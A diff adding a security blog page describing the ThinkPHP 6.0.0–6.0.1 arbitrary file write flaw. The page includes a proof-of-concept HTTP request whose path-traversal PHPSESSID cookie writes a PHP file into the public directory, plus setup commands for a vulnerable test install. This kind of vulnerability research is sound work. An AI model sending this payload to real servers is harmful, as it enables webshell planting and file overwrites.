@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="裤衩哥哥">
+
+
+    <meta name="subtitle" content="裤衩哥哥">
+
+
+    <meta name="description" content="一个信息安全爱好者的自由博客,爱生活爱安全更爱你">
+
+
+    <meta name="keywords" content="星空灵动实验室,北极有只小企鹅,mrtcsy,裤衩哥哥,信息安全爱好者,Python,二次元,信息安全爱好者">
+
+
+<title>Thinkphp 6.0 任意文件操作漏洞 | 星空灵动实验室</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.1.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">kcgg &#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about.html">About</a>
+                
+                    <a class="menu-item" href="/Link">Link</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">kcgg &#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about.html">About</a>
+                
+                    <a class="menu-item" href="/Link">Link</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Thinkphp 6.0 任意文件操作漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">裤衩哥哥</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 16, 2020&nbsp;&nbsp;19:03:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>ThinkPHP 6 任意文件操作漏洞<br>影响范围：ThinkPHP6.0.0-6.0.1<br>利用前提；需要，默认情况下无此漏洞</p>
+<p>漏洞代码：<br>首先漏洞利用前提需要开启Session初始化功能，根据网站业务逻辑功能而定，如Session保存的内容可控则可以直接GETSHELL，如Session文件不可控则可以覆盖任意系统文件。<br>/Users/mr_tcsy/Desktop/tp60/app/middleware.php</p>
+<p><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p26" alt="4f6fef35661eda11cc76caf5bee1f61d.png"></p>
+<p>程序在构造响应数据时会将数据写入session文件，此session文件是由请求数据中PHPSESSID构造而成、且这里当PHPSESSID大于等于32位字符时没有任何过滤。<br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p27" alt="626e7c9552747a61e118db48a556c4b7.png"><br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p28" alt="1e17bdcde60a55acd531d0692083716b.png"><br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p29" alt="68a03d314d677f6af6a38d7b879a65fd.png"><br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p30" alt="aab7cae1f4c18611c51985f56296e7a7.png"><br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p31" alt="554f51c7af62fad04c795f14a829ddf2.png"></p>
+<p>漏洞利用：</p>
+<p>修改文件为以下内容<br>/Users/mr_tcsy/Desktop/tp60/app/controller/Index.php<br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p32" alt="993d7af7782b9959fcb4ff62fd111969.png"><br>开启Session初始化<img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p33" alt="53d35136d568e02d553a964e56676739.png"><br><img src="evernotecid://18BBB81C-CB79-4CE7-BE63-ADCA902BE56F/appyinxiangcom/29112809/ENResource/p34" alt="5170770c0a212ce8af481898a6371375.png"><br>Payload:</p>
+<pre><code>GET /index?test=233 HTTP/1.1
+Host: 10.19.81.99:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=../../../../public/KCGG101111111.php
+Upgrade-Insecure-Requests: 1</code></pre><p>TP6.0框架安装启动</p>
+<pre><code>composer create-project topthink/think tp60
+将 tp60/composer.json 文件的 &quot;topthink/framework&quot;: &quot;^6.0.0&quot; 改成 6.0.0 版本，并执行如下命令。
+composer update
+启动框架
+./think run --host=10.19.81.99</code></pre><p>参考文章：</p>
+<p><a href="https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write" target="_blank" rel="noopener">https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write</a><br><a href="https://www.t00ls.net/thread-54753-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-54753-1-1.html</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>裤衩哥哥</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://kcmoe.cn/2020/04/16/Thinkphp-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/">https://kcmoe.cn/2020/04/16/Thinkphp-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/17/%E5%90%8E%E6%B8%97%E9%80%8F-3389%E7%AB%AF%E5%8F%A3/">后渗透-3389端口</a>
+            
+            
+            <a class="next" rel="next" href="/2020/01/14/CVE-2019-19781/">CVE-2019-19781</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 裤衩哥哥 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
